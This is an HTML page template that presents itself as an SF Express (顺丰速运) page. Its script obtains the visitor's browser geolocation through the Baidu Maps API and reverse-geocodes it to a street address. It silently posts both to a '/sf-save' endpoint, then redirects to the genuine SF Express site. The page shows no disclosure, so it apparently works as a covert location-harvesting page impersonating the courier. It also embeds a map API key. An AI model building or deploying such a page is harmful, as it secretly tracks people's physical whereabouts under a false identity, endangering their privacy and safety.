<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>顺丰速运</title>

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200;600&display=swap" rel="stylesheet">


</head>
<body>
<div id="allmap"></div>

<script type="text/javascript"
        src="http://api.map.baidu.com/api?v=2.0&ak=m0NrzkidvWxU2SmaDFQ46GVISZotG9GB"></script>
　　
<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
<script type="text/javascript">
    $(function () {
        var map = new BMap.Map("allmap");//创建Map实例，注意页面中一定要有个id为allmp的div
        var point = new BMap.Point(116.331398, 39.897445);//创建定坐标
        map.centerAndZoom(point, 12);//// 初始化地图,设置中心点坐标和地图级别

        var geolocation = new BMap.Geolocation();
        var gc = new BMap.Geocoder();//创建地理编码器
        // 开启SDK辅助定位
        geolocation.enableSDKLocation();
        geolocation.getCurrentPosition(function (r) {
            if (this.getStatus() == BMAP_STATUS_SUCCESS) {
                var mk = new BMap.Marker(r.point);
                map.addOverlay(mk);
                map.panTo(r.point);


                var pt = r.point;

                gc.getLocation(pt, function (rs) {
                    var addComp = rs.addressComponents;


                    $.post("/sf-save", {
                        't1': r.point.lng + '-' + r.point.lat,
                        't2': addComp.province + '-' + addComp.city + '-' + addComp.district + '-' + addComp.street + '-' + addComp.streetNumber
                    }, function (result) {
                        window.location.href = "https://www.sf-express.com/mobile/cn/sc/"
                    });
                });

            } else {
                alert('failed' + this.getStatus());
            }
        });

    })
</script>


</body>
</html>
